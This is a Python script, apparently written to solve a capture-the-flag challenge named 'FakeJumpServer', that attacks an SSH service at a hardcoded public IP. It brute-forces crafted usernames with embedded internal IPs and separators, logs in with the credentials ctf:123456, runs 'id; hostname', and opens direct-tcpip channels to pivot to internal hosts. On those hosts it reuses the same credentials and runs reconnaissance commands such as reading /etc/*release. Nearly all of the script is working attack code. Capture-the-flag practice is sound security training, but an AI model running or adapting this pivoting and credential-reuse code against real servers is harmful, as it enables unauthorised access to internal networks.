#!/usr/bin/env python3
"""
深入分析特殊用户名导致连接关闭的行为
这可能是FakeJumpServer的关键特性
"""

import paramiko
import socket
import time

HOST = "61.147.171.105"
PORT = 55300

def test_username_format(username, password="123456", timeout=5):
    """测试特定用户名格式"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(HOST, PORT, username=username, password=password, timeout=timeout, banner_timeout=timeout)
        
        # 成功连接
        transport = client.get_transport()
        key = transport.get_remote_server_key()
        fingerprint = key.get_fingerprint().hex()
        version = transport.remote_version
        
        # 尝试执行命令
        try:
            stdin, stdout, stderr = client.exec_command("id; hostname", timeout=3)
            output = stdout.read().decode('utf-8', errors='ignore').strip()
        except:
            output = "(exec failed)"
        
        client.close()
        return ("SUCCESS", fingerprint, version, output)
    except paramiko.AuthenticationException as e:
        return ("AUTH_FAILED", str(e))
    except paramiko.SSHException as e:
        return ("SSH_ERROR", str(e))
    except socket.timeout:
        return ("TIMEOUT", "Connection timeout")
    except Exception as e:
        return ("ERROR", str(e))

def main():
    print("=" * 70)
    print("[*] 特殊用户名格式深度分析")
    print("=" * 70)
    
    # 基准测试 - 正常用户名
    print("\n[1] 基准测试 (正常用户名)...")
    result = test_username_format("ctf")
    print(f"  ctf: {result}")
    
    # @ 符号系列
    print("\n[2] @ 符号格式测试...")
    at_formats = [
        "ctf@localhost",
        "ctf@127.0.0.1",
        "ctf@172.17.0.1",
        "ctf@10.42.0.1",
        "ctf@real",
        "ctf@host",
        "ctf@ubuntu",
        "ctf@",
        "@ctf",
        "root@localhost",
        "root@172.17.0.1",
        "admin@localhost",
        "user@localhost",
        "test@test",
        "a@b",
        "ctf@ctf",
        "localhost@ctf",
        "172.17.0.1@ctf",
        # 多个@
        "ctf@a@b",
        "a@b@c",
        # @后面是IP
        "ctf@192.168.1.1",
        "ctf@10.0.0.1",
        "ctf@0.0.0.0",
    ]
    
    for fmt in at_formats:
        result = test_username_format(fmt)
        status = result[0]
        if status == "SUCCESS":
            print(f"  {fmt:30} => SUCCESS, fingerprint={result[1][:16]}...")
        elif status == "AUTH_FAILED":
            print(f"  {fmt:30} => AUTH_FAILED")
        else:
            print(f"  {fmt:30} => {status}: {result[1][:50]}")
    
    # % 符号系列
    print("\n[3] % 符号格式测试...")
    percent_formats = [
        "ctf%localhost",
        "ctf%127.0.0.1",
        "ctf%172.17.0.1",
        "localhost%ctf",
    ]
    
    for fmt in percent_formats:
        result = test_username_format(fmt)
        status = result[0]
        print(f"  {fmt:30} => {status}")
    
    # 其他分隔符
    print("\n[4] 其他分隔符测试...")
    other_formats = [
        "ctf:localhost",
        "ctf:172.17.0.1",
        "ctf/localhost",
        "ctf/172.17.0.1",
        "ctf\\localhost",
        "ctf\\172.17.0.1",
        "ctf+localhost",
        "ctf+172.17.0.1",
        "ctf!localhost",
        "ctf#localhost",
        "ctf$localhost",
    ]
    
    for fmt in other_formats:
        result = test_username_format(fmt)
        status = result[0]
        print(f"  {fmt:30} => {status}")
    
    # 特殊关键字
    print("\n[5] 特殊关键字测试...")
    keyword_formats = [
        "jump",
        "proxy",
        "forward",
        "tunnel",
        "admin",
        "flag",
        "root",
        "real",
        "host",
        "target",
        "destination",
    ]
    
    for fmt in keyword_formats:
        result = test_username_format(fmt)
        status = result[0]
        if status == "SUCCESS":
            print(f"  {fmt:30} => SUCCESS, out: {result[3][:50]}")
        else:
            print(f"  {fmt:30} => {status}")
    
    # 分析发现的模式
    print("\n" + "=" * 70)
    print("[*] 深入分析：连接被关闭的用户名")
    print("=" * 70)
    
    # 重新测试导致连接关闭的用户名
    closing_usernames = []
    all_formats = at_formats + percent_formats + other_formats + keyword_formats
    
    for fmt in all_formats:
        result = test_username_format(fmt)
        if result[0] == "SSH_ERROR" and "banner" in result[1].lower():
            closing_usernames.append(fmt)
    
    if closing_usernames:
        print("\n导致连接关闭的用户名:")
        for u in closing_usernames:
            print(f"  - {u}")
        
        # 尝试找到规律
        print("\n分析规律...")
        for u in closing_usernames:
            if "@" in u:
                parts = u.split("@")
                print(f"  {u}: 用户部分={parts[0]}, 目标部分={parts[1]}")

def test_direct_tcpip_after_special_user():
    """测试：先用特殊用户名触发某些行为，再看direct-tcpip"""
    print("\n" + "=" * 70)
    print("[*] 特殊场景：用户名中的IP会被用于转发吗？")
    print("=" * 70)
    
    # 假设：当用户名是 ctf@172.17.0.1 时，dropbear可能会将连接转发到172.17.0.1
    # 但认证仍然用ctf/123456
    
    # 使用原始socket测试
    import socket
    
    def raw_test(username, password):
        print(f"\n测试: {username}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((HOST, PORT))
        
        # 读取banner
        banner = sock.recv(1024)
        print(f"  Banner: {banner[:50]}")
        
        # 发送客户端版本
        sock.send(b"SSH-2.0-test\r\n")
        
        # 读取更多数据
        try:
            data = sock.recv(4096)
            print(f"  Response ({len(data)} bytes): {data[:50]}")
        except socket.timeout:
            print("  (timeout)")
        
        sock.close()
    
    # raw_test("ctf", "123456")
    # raw_test("ctf@172.17.0.1", "123456")

def analyze_10_42_0_1():
    """分析10.42.0.1 - 新发现的可达主机"""
    print("\n" + "=" * 70)
    print("[*] 分析10.42.0.1 (新发现的Ubuntu SSH)")
    print("=" * 70)
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, PORT, "ctf", "123456")
    transport = client.get_transport()
    
    # 连接到10.42.0.1
    print("\n[1] 连接10.42.0.1:22...")
    try:
        chan = transport.open_channel(
            "direct-tcpip",
            ("10.42.0.1", 22),
            ("127.0.0.1", 0)
        )
        
        banner = chan.recv(1024).decode('utf-8', errors='ignore')
        print(f"  Banner: {banner[:60]}")
        
        # 尝试SSH
        chan2 = transport.open_channel(
            "direct-tcpip",
            ("10.42.0.1", 22),
            ("127.0.0.1", 0)
        )
        
        inner = paramiko.SSHClient()
        inner.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # 测试同样的凭据
        try:
            inner.connect("10.42.0.1", username="ctf", password="123456", sock=chan2, timeout=5)
            print("  [!!!] ctf:123456 成功!")
            
            inner_transport = inner.get_transport()
            key = inner_transport.get_remote_server_key()
            fingerprint = key.get_fingerprint().hex()
            print(f"  Host Key: {fingerprint}")
            
            # 执行命令
            stdin, stdout, stderr = inner.exec_command("id; hostname; cat /etc/*release | head -3; ls -la /")
            print(f"  输出:\n{stdout.read().decode()}")
            
            inner.close()
        except paramiko.AuthenticationException:
            print("  ctf:123456 认证失败")
        except Exception as e:
            print(f"  错误: {e}")
        
        chan.close()
    except Exception as e:
        print(f"错误: {e}")
    
    # 比较10.42.0.1和172.17.0.1的host key
    print("\n[2] 比较Host Key...")
    
    targets = [("10.42.0.1", 22), ("172.17.0.1", 22)]
    for host, port in targets:
        try:
            chan = transport.open_channel(
                "direct-tcpip",
                (host, port),
                ("127.0.0.1", 0)
            )
            
            inner = paramiko.Transport(chan)
            inner.start_client()
            key = inner.get_remote_server_key()
            fingerprint = key.get_fingerprint().hex()
            print(f"  {host}:{port} => {fingerprint}")
            inner.close()
        except Exception as e:
            print(f"  {host}:{port} => 错误: {e}")
    
    client.close()

if __name__ == "__main__":
    main()
    analyze_10_42_0_1()
